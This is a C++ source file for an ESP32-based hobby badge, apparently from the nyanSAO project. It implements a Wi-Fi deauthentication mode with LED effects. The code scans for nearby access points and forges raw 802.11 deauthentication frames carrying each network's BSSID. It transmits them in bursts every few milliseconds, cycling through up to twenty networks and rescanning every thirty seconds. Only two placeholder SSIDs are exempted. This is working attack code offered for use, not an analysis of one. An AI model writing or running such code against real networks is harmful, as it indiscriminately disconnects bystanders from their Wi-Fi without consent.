/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/jbohack/nyanSAO
   ________________________________________
*/

#include <Arduino.h>
#include <Adafruit_NeoPixel.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "deauth.h"
#include "modes.h"

extern Adafruit_NeoPixel strip;

#define MAX_APS 20
#define SCAN_INTERVAL 30000
#define DEAUTH_INTERVAL 5

struct AP_Info {
  String ssid;
  uint8_t bssid[6];
  int channel;
};

static AP_Info apList[MAX_APS];
static int apCount = 0;
static unsigned long lastScanTime = 0;
static unsigned long lastDeauthTime = 0;
static int currentApIndex = 0;

static uint8_t deauthFrame[28] = {
  0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00
};

// Modify to whitelist network SSIDs
const char *ssidWhitelist[] = {
  "whitelistExample1",
  "whitelistExample2"
};

const int whitelistCount = sizeof(ssidWhitelist) / sizeof(ssidWhitelist[0]);

inline bool isWhitelisted(const String &s) {
  for (int i = 0; i < whitelistCount; i++) {
    if (s == ssidWhitelist[i])
      return true;
  }
  return false;
}

void sendDeauth(const AP_Info &ap) {
  esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
  memcpy(deauthFrame + 10, ap.bssid, 6);
  memcpy(deauthFrame + 16, ap.bssid, 6);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
  }
}

void performScan() {
  for (int i = STRIP_START; i <= STRIP_END; i++) {
    strip.setPixelColor(i, strip.Color(0x40, 0, 0));
  }
  strip.setPixelColor(EYE_LEFT, strip.Color(0, 0, 0x40));
  strip.setPixelColor(EYE_RIGHT, strip.Color(0, 0, 0x40));
  strip.show();

  apCount = 0;
  int n = WiFi.scanNetworks(false, true);

  if (n > 0) {
    for (int i = 0; i < n && apCount < MAX_APS; i++) {
      String ssid = WiFi.SSID(i);
      if (!ssid.length() || isWhitelisted(ssid)) continue;
      apList[apCount].ssid = ssid;
      memcpy(apList[apCount].bssid, WiFi.BSSID(i), 6);
      apList[apCount].channel = WiFi.channel(i);
      apCount++;
    }
  }

  WiFi.scanDelete();

  if (apCount > 0) {
    Serial.print("Scanned: ");
    Serial.print(apCount);
    Serial.println(" APs");
    for (int i = 0; i < apCount; i++) {
      Serial.print("  ");
      Serial.println(apList[i].ssid);
    }
  }
}

void initDeauthMode() {
  apCount = 0;
  currentApIndex = 0;
  lastScanTime = 0;
  lastDeauthTime = 0;
  performScan();
  lastScanTime = millis();
}

void resetDeauthState() {
  apCount = 0;
  currentApIndex = 0;
}

void deauthMode() {
  static const uint8_t WAVE_INTERVAL = 60;
  static unsigned long lastWaveUpdate = 0;
  static unsigned long lastBlink = 0;
  static unsigned long nextBlinkDelay = 3000;
  static int wavePosition = 0;
  unsigned long now = millis();

  if (now - lastScanTime >= SCAN_INTERVAL) {
    performScan();
    lastScanTime = now;
    currentApIndex = 0;
  }

  if (now - lastDeauthTime >= DEAUTH_INTERVAL && apCount > 0) {
    sendDeauth(apList[currentApIndex]);
    currentApIndex = (currentApIndex + 1) % apCount;
    lastDeauthTime = now;
  }

  if (now - lastWaveUpdate >= WAVE_INTERVAL) {
    lastWaveUpdate = now;

    for (int i = STRIP_START; i <= STRIP_END; i++) {
      uint8_t brightness = (sin((i + wavePosition) * 0.6) + 1) * B(6);
      strip.setPixelColor(i, strip.Color(brightness, 0, 0));
    }
    wavePosition++;
  }

  unsigned long elapsed = now - lastBlink;

  if (elapsed >= nextBlinkDelay) {
    lastBlink = now;
    nextBlinkDelay = random(3000, 6000);
  }

  if (elapsed < 50) {
    strip.setPixelColor(EYE_LEFT, strip.Color(0x30, 0, 0));
    strip.setPixelColor(EYE_RIGHT, strip.Color(0x30, 0, 0));
  } else if (elapsed < 100) {
    strip.setPixelColor(EYE_LEFT, strip.Color(0x20, 0, 0));
    strip.setPixelColor(EYE_RIGHT, strip.Color(0x20, 0, 0));
  } else if (elapsed < 150) {
    strip.setPixelColor(EYE_LEFT, strip.Color(0x10, 0, 0));
    strip.setPixelColor(EYE_RIGHT, strip.Color(0x10, 0, 0));
  } else if (elapsed < 200) {
    strip.setPixelColor(EYE_LEFT, 0);
    strip.setPixelColor(EYE_RIGHT, 0);
  } else if (elapsed < 250) {
    strip.setPixelColor(EYE_LEFT, strip.Color(0x10, 0, 0));
    strip.setPixelColor(EYE_RIGHT, strip.Color(0x10, 0, 0));
  } else if (elapsed < 300) {
    strip.setPixelColor(EYE_LEFT, strip.Color(0x20, 0, 0));
    strip.setPixelColor(EYE_RIGHT, strip.Color(0x20, 0, 0));
  } else if (elapsed < 350) {
    strip.setPixelColor(EYE_LEFT, strip.Color(0x30, 0, 0));
    strip.setPixelColor(EYE_RIGHT, strip.Color(0x30, 0, 0));
  } else {
    strip.setPixelColor(EYE_LEFT, strip.Color(0x40, 0, 0));
    strip.setPixelColor(EYE_RIGHT, strip.Color(0x40, 0, 0));
  }

  strip.show();
}
